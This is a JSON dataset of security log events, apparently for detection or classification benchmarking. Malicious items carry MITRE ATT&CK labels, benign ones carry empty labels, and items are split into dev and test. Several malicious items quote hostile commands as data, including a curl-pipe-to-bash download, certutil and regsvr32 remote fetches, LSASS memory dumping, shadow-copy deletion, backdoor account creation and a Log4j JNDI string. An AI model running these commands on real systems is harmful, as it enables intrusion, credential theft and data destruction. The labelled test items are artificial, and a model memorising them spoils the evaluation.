@@ -1,0 +1,540 @@
+[
+ {
+  "id": "M01",
+  "text": "Event 4625: 214 failed logons for account 'administrator' from 185.220.101.4 over 3 minutes, logon type 3",
+  "labels": [
+   "T1110"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M02",
+  "text": "sshd[2211]: Failed password for invalid user oracle from 45.155.205.9 port 51132 ssh2 (repeated 340 times)",
+  "labels": [
+   "T1110"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M03",
+  "text": "One failed login each for 400 different users using the same password 'Summer2024!' from a single IP in 20 minutes",
+  "labels": [
+   "T1110.003"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M04",
+  "text": "Sysmon EID 1: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4A parent=winword.exe",
+  "labels": [
+   "T1059.001"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M05",
+  "text": "cmd.exe /c net group 'Domain Admins' /domain executed by svc_web, parent process w3wp.exe",
+  "labels": [
+   "T1069.002"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M06",
+  "text": "Sysmon EID 10: procdump64.exe -ma lsass.exe C:\\temp\\l.dmp",
+  "labels": [
+   "T1003.001"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M07",
+  "text": "EID 4688: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\o.dmp full",
+  "labels": [
+   "T1003.001"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M08",
+  "text": "vssadmin.exe delete shadows /all /quiet followed by wbadmin delete catalog -quiet",
+  "labels": [
+   "T1490"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M09",
+  "text": "Over 9,000 files renamed with extension .lockbit within 4 minutes on file server FS02, README ransom note created in every folder",
+  "labels": [
+   "T1486"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M10",
+  "text": "schtasks.exe /create /tn GoogleUpdateTaskMachineCore /tr C:\\Users\\Public\\upd.exe /sc hourly /ru SYSTEM",
+  "labels": [
+   "T1053.005"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M11",
+  "text": "Registry value set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync = C:\\Users\\bob\\AppData\\Roaming\\od.exe",
+  "labels": [
+   "T1547.001"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M12",
+  "text": "certutil.exe -urlcache -split -f http://91.215.85.12/a.exe C:\\Windows\\Temp\\a.exe",
+  "labels": [
+   "T1105"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M13",
+  "text": "Host 10.1.1.99 sent SYN packets to 1,800 distinct ports on 10.1.1.20 within 30 seconds, no completed handshakes",
+  "labels": [
+   "T1046"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M14",
+  "text": "WAF blocked GET /products?id=1' UNION SELECT username,password FROM users-- from 203.0.113.77",
+  "labels": [
+   "T1190"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M15",
+  "text": "Apache access log: GET /cgi-bin/../../../../etc/passwd HTTP/1.1 200 from 198.51.100.23",
+  "labels": [
+   "T1190"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M16",
+  "text": "Suricata: ET EXPLOIT Apache Log4j RCE attempt, ${jndi:ldap://evil.example/a} found in User-Agent header",
+  "labels": [
+   "T1190"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M17",
+  "text": "User opened email attachment Invoice_8841.xlsm; EXCEL.EXE then spawned cmd.exe and wscript.exe",
+  "labels": [
+   "T1566.001",
+   "T1204.002"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M18",
+  "text": "Mail gateway: message from it-support@micr0soft-security.com with link to login-micr0soft.example/verify, 3 users clicked",
+  "labels": [
+   "T1566.002"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M19",
+  "text": "Impossible travel: user j.mehta signed in from Mumbai at 09:02 and from Lagos at 09:20, both successful and MFA satisfied",
+  "labels": [
+   "T1078"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M20",
+  "text": "Azure AD audit: new inbox rule created forwarding all mail to an external address, created from an unfamiliar IP",
+  "labels": [
+   "T1114.003"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M21",
+  "text": "Host 10.2.3.4 issued 12,000 TXT DNS queries with random 60-character subdomains to xk2.badzone.example in one hour",
+  "labels": [
+   "T1071.004",
+   "T1048",
+   "T1572"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M22",
+  "text": "Workstation WS-114 sent 3.8 GB over FTP to 45.9.1.2 at 02:40 local time, user normally sends under 20 MB per day",
+  "labels": [
+   "T1048",
+   "T1041"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M23",
+  "text": "Proxy logs: WS-221 contacts 185.199.0.7:443 every 60 seconds with 214-byte POSTs and an identical User-Agent for 6 hours",
+  "labels": [
+   "T1071.001",
+   "T1029"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M24",
+  "text": "Sysmon EID 8: CreateRemoteThread from C:\\Users\\Public\\x.exe into explorer.exe",
+  "labels": [
+   "T1055"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M25",
+  "text": "EID 4624 logon type 10 to SRV-DB01 from workstation 10.0.5.31, followed by RDP logons to 5 more servers within 10 minutes",
+  "labels": [
+   "T1021.001"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M26",
+  "text": "Remote service PSEXESVC installed via ADMIN$ share on FS01 and FS02 from 10.0.5.31",
+  "labels": [
+   "T1021.002",
+   "T1569.002"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M27",
+  "text": "Event 7045: new service WinDefendUpdate installed with ImagePath cmd.exe /c start C:\\Windows\\Temp\\s.bat",
+  "labels": [
+   "T1543.003",
+   "T1569.002"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M28",
+  "text": "net user support$ P@ssw0rd1 /add then net localgroup administrators support$ /add",
+  "labels": [
+   "T1136.001"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M29",
+  "text": "EID 1102: The audit log was cleared by user admin_tmp",
+  "labels": [
+   "T1070.001"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M30",
+  "text": "Defender real-time protection turned off with Set-MpPreference -DisableRealtimeMonitoring $true by a non-admin script",
+  "labels": [
+   "T1562.001"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M31",
+  "text": "Linux host: crontab for www-data modified to run /tmp/.x/miner every minute",
+  "labels": [
+   "T1053.003"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M32",
+  "text": "bash history: curl http://203.0.113.9/x.sh | bash executed by tomcat user",
+  "labels": [
+   "T1059.004",
+   "T1105"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M33",
+  "text": "Kerberos TGS requests (EID 4769) using RC4 encryption type 0x17 for 40 different service principals from one user in 1 minute",
+  "labels": [
+   "T1558.003"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M34",
+  "text": "EID 4662: DS-Replication-Get-Changes-All requested by non-domain-controller host 10.0.7.8",
+  "labels": [
+   "T1003.006"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M35",
+  "text": "Sysmon EID 1: mshta.exe http://evil.example/p.hta launched from Outlook",
+  "labels": [
+   "T1218.005"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M36",
+  "text": "regsvr32.exe /s /n /u /i:http://203.0.113.20/file.sct scrobj.dll",
+  "labels": [
+   "T1218.010"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M37",
+  "text": "CloudTrail: StopLogging called on trail org-trail by IAM user dev-temp",
+  "labels": [
+   "T1562.008"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M38",
+  "text": "Screenshots captured every 30 seconds by svch0st.exe and written to C:\\Users\\Public\\Libraries",
+  "labels": [
+   "T1113"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M39",
+  "text": "Unknown process nvidiaupd.exe installed a low-level keyboard hook (SetWindowsHookEx WH_KEYBOARD_LL)",
+  "labels": [
+   "T1056.001"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M40",
+  "text": "USB mass storage device inserted on lobby kiosk and autorun.inf executed a hidden binary",
+  "labels": [
+   "T1091",
+   "T1200"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M41",
+  "text": "WMI permanent event subscription created with CommandLineEventConsumer by a non-admin account",
+  "labels": [
+   "T1546.003"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M42",
+  "text": "certutil -decode used to turn a base64 text file into an executable in the temp folder",
+  "labels": [
+   "T1140"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M43",
+  "text": "User www-data ran sudo -l and then sudo /bin/bash on web server",
+  "labels": [
+   "T1548.003"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M44",
+  "text": "WS-77 resolved 30 different random-looking .top domains in 5 minutes, most returned NXDOMAIN",
+  "labels": [
+   "T1568.002"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M45",
+  "text": "rar.exe a -hp C:\\temp\\data.rar staged 3 GB collected from the HR file share before upload",
+  "labels": [
+   "T1560.001"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M46",
+  "text": "New file /var/www/html/uploads/cmd.aspx containing Process.Start created by the IIS worker process",
+  "labels": [
+   "T1505.003"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "M47",
+  "text": "Host 10.0.1.5 sent ICMP echo requests to every address in 10.0.1.0/24 in 12 seconds",
+  "labels": [
+   "T1018",
+   "T1046"
+  ],
+  "split": "dev"
+ },
+ {
+  "id": "M48",
+  "text": "Browser Login Data credential database read by notepad.exe, a non-browser process",
+  "labels": [
+   "T1555.003"
+  ],
+  "split": "test"
+ },
+ {
+  "id": "B01",
+  "text": "Printer firmware update completed successfully on floor 3",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B02",
+  "text": "Scheduled nightly backup job completed with 0 errors on FS01",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B03",
+  "text": "User changed desktop wallpaper and screen saver timeout",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B04",
+  "text": "Windows Update installed KB5034441 and requested a restart",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B05",
+  "text": "VPN login successful for employee a.kumar from the Bengaluru office IP during business hours",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B06",
+  "text": "Disk usage on /var/log at 78%, below alert threshold",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B07",
+  "text": "New employee account created from HR ticket HR-2291 and added to the Sales group",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B08",
+  "text": "Monthly password expiry reminder email sent to 35 users",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B09",
+  "text": "NTP time synchronization succeeded with pool.ntp.org",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B10",
+  "text": "nginx restarted by systemd after scheduled log rotation",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B11",
+  "text": "Zoom client updated to the latest version on 12 laptops through the software center",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B12",
+  "text": "Conference room display lost HDMI signal for 2 seconds",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B13",
+  "text": "Antivirus signature database updated successfully to version 1.405.22 on all endpoints",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B14",
+  "text": "Teams meeting recording saved to SharePoint by organizer priya.s",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B15",
+  "text": "Database nightly index maintenance finished in 14 minutes on SQL-PROD-02",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B16",
+  "text": "Employee badge reader on floor 2 reported a firmware version mismatch, ticket opened",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B17",
+  "text": "Outlook calendar sync completed for 220 mailboxes",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B18",
+  "text": "Load balancer health check passed for all 6 web nodes",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B19",
+  "text": "Group policy refresh applied successfully on 48 workstations",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B20",
+  "text": "SSL certificate for intranet.example.com renewed automatically by the certificate manager",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B21",
+  "text": "Laptop LT-0412 enrolled into the device management system by the helpdesk",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B22",
+  "text": "Log rotation compressed 3 GB of old application logs on app-server-3",
+  "labels": [],
+  "split": "test"
+ },
+ {
+  "id": "B23",
+  "text": "User opened the quarterly sales report PDF from the shared finance drive",
+  "labels": [],
+  "split": "dev"
+ },
+ {
+  "id": "B24",
+  "text": "DHCP lease for printer PR-FL3 renewed without changes",
+  "labels": [],
+  "split": "test"
+ }
+]
